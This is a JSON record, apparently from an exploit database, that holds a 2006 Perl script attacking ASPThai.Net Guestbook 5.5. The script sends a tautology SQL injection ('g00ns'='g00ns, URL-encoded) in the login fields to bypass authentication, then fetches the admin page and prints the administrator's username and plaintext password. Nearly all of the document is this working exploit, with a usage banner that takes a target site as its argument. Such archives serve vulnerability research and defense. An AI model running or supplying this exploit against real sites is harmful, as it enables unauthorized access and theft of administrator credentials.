{
  "id": "1472",
  "title": "ASPThai.Net Guestbook 5.5 - Authentication Bypass",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n# SQL Injection Exploit for ASPThai.Net Guestbook <= 5.5  \r\n#(And possible higher could not find a site to test it on)\r\n# This exploit shows the username of the administrator and the password In plain text\r\n# Bug Found by muderskillz Coded by Zodiac\r\n# Shouts to cijfer,uid0,|n|ex,ph4tel,z3r0,lethal, Felosi,seven,Spic and anyone else I forgot.\r\n# http://exploitercode.com/ http://www.g00ns.net \r\n#irc.g00ns.net #g00ns  email = zodiac@g00ns.net\r\n#(c) 2006\r\n\r\nuse LWP::UserAgent;\r\nuse HTTP::Cookies;\r\n\r\n$Server = $ARGV[0];\r\n\r\nif($Server =~m/http/g)\r\n{\r\n$Server=~ 'http://$Server';\r\nprint \r\n}\r\nelse {\r\n  print $error;\r\n}\r\n\r\nif(!$Server) {usage();exit() ;}\r\n\r\nhead();\r\n\r\nprint \"\\r\\nGrabbing Username And Password\\r\\n\\n\";\r\n\r\n#Login's and stores a cookie to view admin panel later\r\n\r\n\r\n $xpl = LWP::UserAgent->new() or die;\r\n $cookie_jar = HTTP::Cookies->new();\r\n\r\n $xpl->agent('g00ns');\r\n $xpl->cookie_jar($cookie_jar);\r\n\r\n $res = $xpl->post(\r\n $Server.'check_user.asp',\r\n Content => [ \r\n\r\n\t'txtUserName' => '\\' or \\'%67%30%30%6e%73\\'=\\'%67%30%30%6e%73', \r\n\t'txtUserPass' => '\\' or \\'%67%30%30%6e%73\\'=\\'%67%30%30%6e%73',\r\n\t'Submit' => '-= Login =-',\r\n ],\r\n );\r\n\r\n# Create a request\r\nmy $req = HTTP::Request->new(GET => \r\n\r\n$Server.'change_admin_username.asp'\r\n\r\n);\r\n\r\n$req->header('Referer', $Server.'admin_menu.asp');\r\n\r\nmy $res = $xpl->request($req);\r\n\r\n$info= $res->content;\r\n\r\nif($info =~ m/Unauthorised\\sAccess|The\\spage\\scannot\\sbe\\sfound/) \r\n{ \r\n die \"Error Connecting...\\r\\n\"; \r\n}\r\n\r\n#Check the outcome of the response\r\n\r\n$info=~m/(value=\\\")(\\n+|\\w+|\\W+)/g;\r\n$User = $2;\r\n$info=~m/(value=\\\")(\\n+|\\w+|\\W+)/g;\r\n$Pass= $2;\r\n\r\nprint \"UserName:$User\\r\\nPassword:$Pass\\r\\n\";\r\n\r\nsub head()\r\n {\r\n print \"\\n=======================================================================\\r\\n\";\r\n print \"* ASPThai.Net Guestbook version 5.5 SQL Injection by www.g00ns.net *\\r\\n\";   \r\n print \"=======================================================================\\r\\n\";\r\n }\r\nsub usage()\r\n {\r\n head();\r\n print \" Usage: Thaisql.pl <Site>  \\r\\n\\n\";\r\n print \" <Site> - Full path to Guestbook e.g. http://www.site.com/guestbook/ \\r\\n\";\r\n print \"=======================================================================\\r\\n\";\r\n print \"   -=Coded by Zodiac, Bug Found by MurderSkillz=-\\r\\n\";\r\n print \"www.exploitercode.com www.g00ns.net irc.g00ns.net #g00ns\\r\\n\";\r\n print \"=======================================================================\\r\\n\";\r\n\r\n# milw0rm.com [2006-02-06]",
  "url": "https://www.exploit-db.com/exploits/1472"
}